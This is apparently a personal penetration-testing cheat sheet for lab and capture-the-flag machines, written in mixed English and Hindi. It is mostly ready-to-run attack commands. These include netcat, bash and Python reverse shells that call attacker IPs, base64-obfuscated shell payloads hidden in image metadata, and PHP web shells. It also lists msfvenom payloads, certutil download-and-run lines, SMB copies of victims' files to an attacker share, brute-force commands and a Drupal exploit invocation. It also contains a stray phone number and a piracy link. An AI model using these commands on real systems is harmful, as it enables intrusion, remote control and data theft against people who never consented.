how to


https://github.com/uknowsec/SweetPotato?tab=readme-ov-file    sweetpotato

└─# python3 -m pip install --force-reinstall pyparsing   ----dirsearch python issue

python ntlm_theft.py -g all -s 192.168.45.212 -f test      ------ntlm theft

dirty-pipe  --- https://github.com/rexpository/linux-privilege-escalation

./git_dumper.py http://website.com/.git ~/website   ----https://github.com/arthaud/git-dumper

copy admintool.exe admintool_backup.exe

or 

copy admintool.exe C:\backup\admintool_backup.exe

or powershell

Copy-Item admintool.exe -Destination C:\backup\admintool_backup.exe


admintool_backup1.exe
 
 .\nc64.exe -e cmd.exe 192.168.45.196 4444
 
nc <attacker_ip> 4444 -e /bin/bash


sudo nmap -sV -T4 -p- -A 192.168.157.117

# nmap -v -p- 192.168.241.250  



 # nmap -v -sV -sT -A -O -sC -p 135,139,445,3389,5040 192.168.241.250
 
https://meet.google.com/shb-fnmq-uhg

https://book.hacktricks.wiki/en/generic-hacking/brute-force.html

https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/

https://htbmachines.github.io/



sudo nmap -sC -sV -vv -oA  10.10.11.33

nmap -v -sT -sV  -T4 -p- 192.168.1.172

nmap -v -sT -sV -sC -A -O -p- 192.168.1.172 -o nmapoutput.txt

nmap -v -sU -sV -sC -A -O -p 161,500 192.168.1.172


nmap -v -sT -sV -sC -A -O -p 80,443 scan port which is open  192.168.1.172 -o nmapoutput2.txt  

nmap -T4  -p- -A 10.10.10.11

nmap -T5 --top-ports 10000 -sS -n -Pn --min-rate=1000 10.10.11.35         -----tcp

nmap -T5 --top-ports 2000 -sS -n -Pn --min-rate=50 10.10.176.148     ----tcp

nmap -T5 --top-ports 10000 -sU -n -Pn --min-rate=5000 10.10.10.116      -----udp


nmap -sC -sV -v 10.10.10.82

nmap -v -sT -p 445 --script=smb-vuln-*  192.168.1.winxp

smbclient -L //10.10.10.97 -U 'tyler'

smbclient //10.10.10.100/Replication -U ""%""

smbmap -H 10.10.11.35 -u 'ananymous'

smbclient //10.10.11.35/HR -N

dirsearch -u http://192.168.1.172:8080/


feroxbuster -u http://192.168.117.225:8090/ -k -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,js,css,txt,sh,bak,log,cgi,asp,aspx,html

feroxbuster --url=http://192.168.1.218   -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o

feroxbuster -u http://10.10.10.93/ -x asp,aspx,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 100 -s 200,301 -n

dirsearch -u http://192.168.1.172:8080/-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

 enum4linux 192.168.1.3
 
 ghidra -----to uncompile file
 
 /usr/share/webshells/php      --------  backdoor loaction on our linux

dirb http://192.168.1.109

-w /usr/share/wordlists/dirb/common.txt

whatweb http://192.168.1.172:8080/

nikto -h http://192.168.1.172/

nuclei -u http://192.168.1.172:8080/ 

gobuster

gobuster dir -u http://10.10.10.56:80 -w /usr/share/wordlists/dirb/small.txt -s 302,307,200,204,301,403 --status-codes-blacklist ""

gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -s 302,307,200,204,301,403 --status-codes-blacklist "" -x sh

 gobuster dir -u http://192.168.1.9:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip
 
  gobuster dir -u http://192.168.1.9:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip,asp,aspx,txt
 
  gobuster dir -u http://192.168.1.9:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx,txt
 
 gobuster vhost --append-domain -u driftingblues.box -w /usr/share/wordlists/dirb/common.txt
 
 gobuster dir -r -u http://test.driftingblues.box/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php,html -o dir-common.log
 
  gobuster dir -u http://192.168.1.9:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x *
  
   gobuster dir --url https://earth.local -w /usr/share/wordlists/dirb/common.txt -k
 
 ffuf -u http://192.168.1.7/history.php?FUZZ=sandeep -w /usr/share/wordlists/dirb/big.txt -b "PHPSESSID=li352tno8a68iutindhshcolen" -fs 0
 
 sqlmap -u http://192.168.2.121/history.php?user=admin --cookie="PHPSESSID=li352tno8a68iutindhshcolen" --dump
 
kernal grap link 
└─#  curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: "| cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '     

└─#  curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: "| cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '     |   grep 2.6.24

Dirtycow link
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
 

 
 


mysql  

 mysql -h 192.168.1.15 -u EMMANUEL  -p   -----login from machine 
  
 wpscan
 
 wpscan --url http://192.168.1.8/wordpress/ -t 200 --disable-tls-checks --enumerate u,ap,at,cb,dbe --plugins-detection aggressive --plugins-version-detection aggressive
 
  wpscan --url http://192.168.244.244 --enumerate p --plugins-detection aggressive
  
 cewl -d 3 -w password.txt http://192.168.1.8/wordpress/


   wc -l password.txt


wpscan --url http://192.168.1.8/wordpress/ -t 200 --disable-tls-checks --enumerate u -P /usr/share/wordlists/rockyou.txt

    wpscan --url http://dc-2 -t 200 --disable-tls-checks --enumerate u -P password.txt

 wpscan --url http://wordy --disable-tls-checks --usernames admin,graham,jens,mark,sarah -P /usr/share/wordlists/rockyou.txt

http://192.168.2.110/wp-content/themes/twentyfifteen/footer.php

http://192.168.1.9/wp-content/themes/twentyeleven/footer.php

http://192.168.1.12/wp-content/themes/twentytwentyone/footer.php

http://192.168.130.55/wp-content/themes/twentytwenty/footer.php


UPDATE wp_users SET user_pass = '$P$B4kJ5e5RYoa4ZSENXR/UhCuEDJttdr0' WHERE user_login = 'unclestinky';



hydra 

hydra -L fsocity.dic -p test 192.168.1.19 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid"


hydra -l elliot -P passwords.txt 192.168.1.19 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect" -V

hydra -L user.txt -P password.txt -e nsr


└─# hydra -l admin -P password.txt  http-get://192.168.2.105:8080/manager/html  -V

--------------------------------------------------------------------------------------------------------------------
sort fsocity.dic  | uniq > text1.dic    ---for short duplicates

image scanning tool  ----strings  keep-calm.png| tr '\n' ' '

cat  /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt               ---to short password
---------------------------------------------------------------------------------------------------------------------

 php wrapper 
 https://infinitelogins.com/2020/04/25/lfi-php-wrappers-to-obtain-source-code/    ----to see source code 
 
 page=php://filter/convert.base64-encode/resource=login
 
 page=php://filter/convert.base64-encode/resource=config
 
 
 
 
 
 -----------------------------------------------------------------------------------------------------------
 
 ssh by hydra 
 
 └─# hydra -l root -p root -s 22  ssh://192.168.1.210  -t 4  -v                     ------isse ladiya 

└─# hydra -l root -P password.txt -s 22  ssh://192.168.1.210  -t 4 -V      -----isse lake nahi diya

└─# hydra -C  ssh-betterdefaultpasslist.txt -s 22  ssh://192.168.1.210  -t 4  -V    isne lake dediya   


ftp  by hydra

hydra -uVf -L user.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.4


pop3 by hydra

hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.88 -s55007 pop3 -I -t 20   ---working

hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f pop3://172.16.4.131:55007 -V 

hydra -l boris -P /usr/share/wordlists/fasttrack.txt -t20 172.16.4.131 -s55007 -I pop3


 
 
 -----------------------------------------------------------------------------------------------------------------------------
 
 fuzz command 
 
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .html,.php,.txt -u http://10.0.2.114:8080/FUZZ -of html -o dir.html -fs 2899
 
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://10.0.2.114:8080/administration.php?FUZZ=anything' -of html -o admin-get.html -fs 65
 
  ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://:8080/administration.php?FUZZ=anything' -of html -o admin-get.html 
 
   arjun -u http://192.168.1.4:8080/administration.php/
 
   └─# wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 http://192.168.1.8/index.php?FUZZ=something 
 
 wfuzz -c --hc 404 -w /root/vulnhub/troll2/weblist.txt http://192.168.56.120/FUZZ
 
 wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.1.74/thankyou.php?FUZZ=something | awk '{print}' | grep --color=auto -P "66 W|$"
 
 wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.1.74/thankyou.php?FUZZ=something | awk '{print}' | grep --color=auto -P "66 W|42 L|851 Ch"
 
 
 subdomain finding
 └─# curl -I -H "Host: .streamio.htb" https://streamio.htb --insecure 

HTTP/2 404 
content-length: 315
content-type: text/html; charset=us-ascii
server: Microsoft-HTTPAPI/2.0
date: Sat, 05 Apr 2025 16:30:07 GMT

 wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "https://streamIO.htb" -H "Host: FUZZ.streamIO.htb" --hw 315 --hc 404 
 
filter by size 

ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://192.168.1.74/thankyou.php?FUZZ=anything' -of html -fs 852
 
filter by words

ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://192.168.1.74/thankyou.php?FUZZ=anything' -of html  -fw 30  

filter by lines 

ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://192.168.1.74/thankyou.php?FUZZ=anything' -of html -fl 43


 -----------------------------------------------------------------------------------------------------------------------------------------
 crack zip file 
 
  fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip    -----for unzip file 
  
zip2john sitebackup3.zip  > output.txt

rm ~/.john/john.pot

  
   msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.175 LPORT=443 -f war > shell.war 
 --------------------------------------------------------------------------------------------------
 eccode for getting shell 

echo "bash -i >& /dev/tcp/192.168.45.215/443 0>&1"  | bash

echo "bash -i >& /dev/tcp/192.168.45.215/8080 0>&1"  | base64

echo "bash -i >& /dev/tcp/10.10.14.15/443 0>&1"  | base64

bash-i>&/dev/tcp/192.168.2.145/443 0>&1

./nc64  192.168.45.249 443 -e /bin/bash

nc  192.168.45.175 80 -e /bin/bash

scp root@172.16.4.1:/root/statick-binary/nc64 /tmp

echo  YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIxOS80NDMgMD4mMQo=| base64 -d | bash

echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzMi80NDQ0IDA+JjEK | base64 -d | bash#


<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.233/8080 0>&1'"); ?>


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc  192.168.45.219 80 >/tmp/f

<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc  192.168.45.219  4444>/tmp/f")?>

<?php echo system($_REQUEST["cmd"]); ?>



<?php system($_GET['cmd']); ?>

<?php system($_REQUEST["cmd"]); ?>

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.89",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


GET /view.php?page=../../../usr/databases/dell.php&cmd= 


strings initrd.img | paste -sd " "

also check custom binary with strings command 

steghide extract  -sf  funny.jpg

stegseek funny.jpg


scp strings initrd.img  root@192.168.2.145:/home/sandeep/Music


└─# exiftool -Comment='ZWNobyAiWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNREUwTGpFd0x6UTBNeUF3UGlZeENnPT0iIHwgIGJhc2U2NCAtZCB8ICBiYXNo' rex6.png

exiftool -Comment='ZWNobyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC80NDMgMD4mMSIgIHwgYmFzaA==' rex6.png


Password making tool

mp64 k1ll0r?a?a >>  password.txt                            ---------making last to digit every passible password


Decode fuck language  tool


https://www.cachesleuth.com/bfook.html


mkaing statick shell so that we can out restricted mode from rbash
vi 
:set shell=/bin/sh
:shell

export SHELL=/bin/bash:$SHELL
export PATH=/usr/bin:$PATH

https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/


export PATH=/bin:$PATH

echo /home/guest/prog/*

--------------------------------

uncompyle6 -o <output_directory> <path_to_pyc_file>


zip -r myfolder.zip myfolder/
-----------------------------------------------------------------------------------


tool      -----this tool give password from log

from id we knew that we are adm member

cry0l1t3@academy:/var/log$ aureport --tty 

-----------------------------------------------------------------------------------

agar script root se run karrahi hogi to apne ssytem pe shell miljaega 
nano emergency.py 

chmod +x  emergency.py 

import os 

os.system('nc -e /bin/bash 192.168.1.89 443')


nc -nlvp 443


--------------------------------------------------------------------------------------------------

pspy link 64 bit
https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

pspy link 32  bit
https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32

linpease
https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/linpeas.sh


winpease
https://github.com/peass-ng/PEASS-ng/releases/tag/20250424-d80957fb


keeweb2info
https://app.keeweb.info/
-------------------------------------------------------------------------------------------------------

nikto tricks

 nikto - url http://192.168.56.12/view.php?page=tools.html





-------------------------------------------------------------------------------------------------------

i want to make script name called wolf  for runnning different tools scan first i want  to do nmap port scan from this command  nmap -v -p- 192.168.1.12 -o open-port.txt next i want to nmap scan from this command nmap -v -sT -sV -sC -A -O -p- 192.168.1.172 -o nmap-output.txt . 3rd  i want t scan dirsearch from this command   dirsearch -u 192.168.1.12  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -o dirscan.txt  .next i want scan whatweb scan from this command-- whatweb  192.168.1.12 -o whatweb-output.txt . after that i want to nikto scan  from this command nikto -h 192.168.1.12 -o nicto output.txt.  after that i want to  cms scan from this command cmseek -u 192.168.1.12 -o cms-output.txt

--------------------------------------------------------------------------------------------


smb check without login 




smblogin with user 

'
smbclient //192.168.1.3/kathy





https://github.com/7h3rAm/writeups?tab=readme-ov-file

https://www.geeksforgeeks.org/what-is-http-etag/


--------------------------------------------------------------------------------------------------------------
statick shell command 

command for stable shell   ----ye command hacktools se uthai he 

python -c 'import pty;pty.spawn("/bin/bash")'   
export TERM=xterm
Ctrl + Z                                                 -----yaha tak ye command chalana he machine ke andar           
stty raw -echo; fg                                       ------isse bahar aajaenge 
stty rows 24 columns 80                                ------ uske bad ye command chalana he 






---------------------------------------------------------------------------------------------------------------



problems   and solution



└─# ssh-keygen -f '/root/.ssh/known_hosts' -R '192.168.1.4'



ssh-keygen -f '/root/.ssh/known_hosts' -R '172.16.4.1'


obtain full interactive shell 

Obtaining a full interactive shell with zsh
python -c 'import pty;pty.spawn("/bin/bash")'
 python -c "import pty;pty.spawn('/bin/bash')"
 python -c 'import pty; pty.spawn("/sbin/sh")'
$ Ctrl + Z
stty -a |head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
stty raw -echo; fg
reset
$ Ctrl + D
export SHELL=bash
export TERM=xterm256-color 
stty rows 24 columns 80
bash -i
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
export SHELL-bash
cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set export PS1='[\u@\h \W]\$']


or 

python3 -c 'import pty;pty.spawn("/bin/bash")'
$ Ctrl + Z
stty -a |head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
  stty raw -echo; fg  
reset 
cntrl+D
stty rows 39 columns 782

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.4.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


php -r '$sock=fsockopen("172.16.4.1",443);exec("/bin/sh -i <&3 >&3 2>&3");'



https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html?highlight=cap_sys_admin#cap_sys_admin

9993270658
-----------------------------------------------------------------------------------------

impacket-smbserver share $(pwd) -smb2support 


victim --  copy  \\192.168.45.246\share\r.exe

.\r.exe /user:secura.yzx\Administrator /pass:"Reality2Show4!.?" cmd



copy  \\10.10.16.4\share\raj.dll

copy  \\192.168.45.159\share\nc.exe  

reverse

sudo impacket-smbserver share $(pwd) -smb2support

net use \\192.168.45.178\share

reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /t REG_DWORD /d 1 /f

copy C:\Users\milana\Documents\* \\192.168.45.178\share

copy C:\Users\Administrator\Desktop\*  \\10.10.14.10\share

OR for single file 

copy C:\Users\Alfred\Desktop\Common.fxh \\10.10.16.5\share

--------------------------------------------------------------------------------------------------

# impacket-smbserver share . -smb2support  -user test -password 123 

 net use \\192.168.45.159\share /user:test 123   
 
 
 C:\Users\joe\Downloads\*   \\192.168.45.210\share
 
 copy C:\Users\marcus\20250718040914_BloodHound.zip \\192.168.45.238\share\

---------------------------------------------------------------------------------------------------
netexec smb 192.168.237.250 -u offsec -p lab --exec-method smbexec -x 'copy C:\Tools\Professional2019Retail.img C:\Users\Public\'

impacket-smbclient WINPREP/offsec:lab@192.168.237.250

------------------------------------------------------------------------------------------------------

http://10.10.16.4/ms11-046.exe

powershell Invoke-WebRequest "http://10.10.14.10/nc64.exe" -OutFile "C:Utils\nc64.exe" 

.\nc64.exe  -e cmd.exe 10.10.14.10 443

Start-Process "exploit.exe"
.


python3 drupa7-CVE-2018-7600.py -c "certutil -urlcache -split -f http://10.10.16.4/nc.exe C:\\Users\\Public\\nc.exe" http://10.10.10.9

python3 drupa7-CVE-2018-7600.py -c "nc.exe -e cmd.exe 10.10.16.4 443" http://10.10.10.9



tells which system is vulnerable to which cve




JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.16.4 4444" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}


--------------------------

smb

nmap -v -sT -sV -sC  -p 445,139,135,137 --script=smb-enum-*  192.168.1.8,21

smbclient -L //10.10.10.97

smbclient //10.10.11.202/Public 

smbclient //10.10.11.174/support-tools

smbclient -L //10.10.10.97 -U tyler       ----for checking share

smbclient //10.10.10.97/new-site -U tyler      ------for login    if user known 

smbclient   //192.168.1.21/ADMIN$ -U 'administrator%@rmour123'     -----login with user id password

smbclient //10.10.10.100/Replication -U ""%""   -----anonoumous login

smbclient //10.10.10.100/Replication -N

smbclient --list //192.168.1.35 -U  “ ”    -----show shares

smbclient   --list  //10.10.10.100 -U “”  -N  ------------Null sesssion with no password 

smbclient   --no-pass  //10.10.10.100/support-tools         -----login publick share with no password
-------

smb tool  -----to extract usernname 

crackmapexec smb 10.10.11.35 -u anonymous -p '' --rid-brute


nxc smb 10.10.11.35 -u 'anonymous' -p '' --rid-brute

nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'


nmap --script smb-os-discovery 192.168.1.17

smbmap -H 192.168.1.40

smbmap -H 10.10.11.174 -u ananymous    ---show which share is public   

smbmap -H 192.168.1.17 -u raj -p 123

smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18

 hydra -L user.txt -P user.txt  smb://10.10.10.193
 
 hydra -L users.txt -P pwd.txt 10.129.2.5 smb


nmap -v -sT -p 445 --script=smb-vuln-* 10.10.10.4  

nxc smb 10.10.11.14

nxc smb  10.10.11.14  --shares

nxc smb 10.10.11.14 -u ‘ . ’  -p ‘ ’ --shares

nxc smb 10.10.11.14 -u ‘  ’  -p ‘ ’ --shares






xp_dirtree \\10.10.16.4\uwu

------------------------------------------------------------------------------------------------

ldap enum 


------------------------------------------------------------------------------------------------

rpc enum

rpcclient  -U “” -N 192.168.1.28




Listing Shares
    # rpcclient -U "" <target_IP> -c "netshareenum"

Enumerating Users
    # rpcclient -U "" <target_IP> -c "enumdomusers"

Enumerating Groups
    # rpcclient -U "" <target_IP> -c "enumdomgroups"

Retrieving User Information
    # rpcclient -U "" <target_IP> -c "queryuser <User_RID>"

Enumerating Group Membership
    # rpcclient -U "" <target_IP> -c "querygroupmem <Group_RID>"

Enumerating Policies
    # rpcclient -U "" <target_IP> -c "getdompwinfo"

Enumerating Domain Controllers
    # rpcclient -U "" <target_IP> -c "getdcname"

Dumping LSA Secrets (if permissions allow) Dump sensitive security information
    # rpcclient -U "" <target_IP> -c "lsaquery"
    
    
    -------------
    
    cd /opt/powershell/PowerSploit/Recon              ----Invoke-PowerShellTcp.ps1    location from Remote machine   
    
    /usr/share/doc/python3-impacket/examples          -----impacket  .py files locations
    
    
    
    
    ----------------------
    
    windows defender path check
    
    reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" 
    
    
    
    generate payload 

 #   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=443 -f exe > shell.exe 
  or 
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=443 LHOST=10.10.14.54 -f exe -o reverse.exe
Start listner - 
 $ msfconsole
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > show options 
 msf6 exploit(multi/handler) > set lhost 10.10.14.6
 msf6 exploit(multi/handler) > set lport 443
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
 msf6 exploit(multi/handler) > run
 
 
 ---------------------------------------------------------------------------------------------------------------
 
 https://www.hackingarticles.in/category/dacl-attacks/
 
 https://github.com/Shubhamvarmaa/AD-DS-ACL-Automation/blob/main/Configure-acl.ps1
 
 https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html
 
 https://filepursuit.com/file/39829531-House-of-Cards-S01-E02-WebRip-720p-Hindi-English-AAC-5-1-x264-ESub-mkv/
 
 https://github.com/geeksniper/windows-privilege-escalation?tab=readme-ov-file#windows-defender
 
 https://www.ibrahimisiaqbolaji.com/2025/06/fluffy-htb-walkthrough.html
 
 
 
 
 seventeen
 
 
 
 
 



